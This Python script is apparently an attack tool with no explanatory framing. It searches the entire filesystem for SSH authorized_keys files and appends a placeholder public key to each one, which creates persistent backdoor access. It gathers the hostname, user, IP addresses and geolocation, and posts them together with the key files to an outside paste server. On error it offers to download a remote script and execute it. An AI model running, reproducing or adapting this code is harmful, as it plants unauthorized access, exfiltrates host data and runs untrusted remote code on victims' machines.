import os
import json
import requests
import socket
import getpass

# Function to get current user
def get_current_user():
    return getpass.getuser()

# Function to get hostname
def get_hostname():
    return socket.gethostname()

# Function to get IPv4 and IPv6 addresses
def get_ip_addresses():
    ipv4 = json.loads(requests.get('https://api.ipify.org?format=json').text)['ip']
    ipv6 = json.loads(requests.get('https://api64.ipify.org?format=json').text)['ip']
    return (ipv4, ipv6)

# Function to get geolocation
def get_geolocation(ip):
    url = f'https://api.ipgeolocation.io/ipgeo?apiKey=2b65378da0a04f5dae23eb7d18a15cb5&ip={ip}'
    return json.loads(requests.get(url).text)

# Function to add ssh key to authorized_keys file
def add_ssh_key(file_path, ssh_key):
    with open(file_path, 'a') as f:
        f.write(ssh_key + '\n')

# Function to send data to hastebin
def send_to_hastebin(data):
    url = 'https://trknhaste.justinacabadabr.repl.co/documents'
    response = requests.post(url, data=data)
    return response.json()['key']

# Search for authorized_keys files
root_dir = '/'
authorized_keys_files = []
for root, dirs, files in os.walk(root_dir):
    for file in files:
        if file == 'authorized_keys':
            authorized_keys_files.append(os.path.join(root, file))

# Add ssh key to authorized_keys files
ssh_key = 'ssh-rsa exemple'
for file_path in authorized_keys_files:
    add_ssh_key(file_path, ssh_key)

# Get current user, hostname, IPv4 and IPv6 addresses, and geolocation
current_user = get_current_user()
hostname = get_hostname()
ipv4, ipv6 = get_ip_addresses()
geolocation = get_geolocation(ipv4)

# Read content of authorized_keys files
authorized_keys_data = ''
for file_path in authorized_keys_files:
    with open(file_path, 'r') as f:
        authorized_keys_data += f.read()

# Send data to hastebin
data = f'Hostname: {hostname}\nCurrent User: {current_user}\nIPv4: {ipv4}\nIPv6: {ipv6}\nGeolocation: {geolocation}\nAuthorized Keys: {authorized_keys_data}'
haste_key = send_to_hastebin(data)
print(f'Data sent to hastebin, key: {haste_key}')

# Download and run script from online source if error occurs
try:
    # Code that may cause an error
    with open("/root/.ssh/authorized_keys", "r") as f:
        keys = f.read()
    with open("/home/user/.ssh/authorized_keys", "r") as f:
        keys = f.read()
except Exception as e:
    print("An error occurred: ", e)
    confirm = input("Do you want to download and run the script from an online source? (y/n)")
    if confirm == "y":
        script_url = "https://hastebytrhacknon.trhacknon.repl.co/raw/conajiro"
        response = requests.get(script_url)
        open("script.py", "wb").write(response.content)
        os.system("python3 script.py")
    else:
        print("Exiting program.")

